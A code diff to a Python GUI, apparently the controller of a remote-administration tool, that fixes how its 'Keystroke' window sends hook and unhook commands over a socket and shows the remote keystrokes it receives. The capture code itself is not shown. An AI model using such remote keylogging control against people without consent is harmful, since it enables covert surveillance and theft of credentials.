@@ -193,14 +193,24 @@ def Keystroke():
     newApp.title("Keystroke")  
     e = Entry(newApp, width = 55)
     e.grid(row = 1, column = 0,columnspan= 4)
+    unhook_press = False
     def hook():
+        nonlocal unhook_press
+        unhook_press = False
         client.sendall(bytes("Hook Key","utf8"))
         check = client.recv(1024).decode("utf8")
     def unhook():
-        nonlocal size, string
-        client.sendall(bytes("Unhook Key","utf8"))
-        size , string = Recieve_Hook(client, HOST, PORT)
+        nonlocal size, string, unhook_press
+        if unhook_press == False:
+            client.sendall(bytes("Unhook Key","utf8"))
+            size , string = Recieve_Hook(client, HOST, PORT)
+            unhook_press = True
     def xem():
+        nonlocal size, string, unhook_press
+        if unhook_press == False: 
+            client.sendall(bytes("Unhook Key","utf8"))
+            size , string = Recieve_Hook(client, HOST, PORT)
+            unhook_press = True
         e.delete(0,END)
         e.insert(0,string)
     def xoa():
